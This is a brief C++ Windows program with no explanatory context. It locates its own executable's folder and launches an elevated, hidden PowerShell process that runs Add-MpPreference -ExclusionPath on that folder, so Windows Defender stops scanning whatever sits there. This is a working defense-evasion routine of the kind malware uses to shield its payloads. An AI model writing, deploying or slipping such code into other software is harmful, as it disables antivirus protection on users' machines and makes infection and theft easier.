#define _WIN32_WINNT _WIN32_WINNT_WINXP
#define NOMINMAX
#include <windows.h>
#include <string>


void GetModuleDirectory(std::wstring& Result);

int _stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd) {

    std::wstring filePath;
    GetModuleDirectory(filePath);
    std::wstring args = L"Add-MpPreference -ExclusionPath '";
    args += filePath;
    args += L"'";
    MessageBox(0, args.c_str(), L"", 0);
    ShellExecute(NULL, L"runas", L"powershell.exe", args.c_str(), NULL, 0);
}

void GetModuleDirectory(std::wstring& Result)
{
    wchar_t* FilePath = new wchar_t[MAX_PATH];
    std::size_t length = GetModuleFileName(NULL, FilePath, MAX_PATH);
    Result = FilePath;

    size_t last_slash_pos = Result.rfind('\\');
    if (last_slash_pos != std::string::npos) 
    {
        Result =  Result.substr(0, last_slash_pos);
    }
}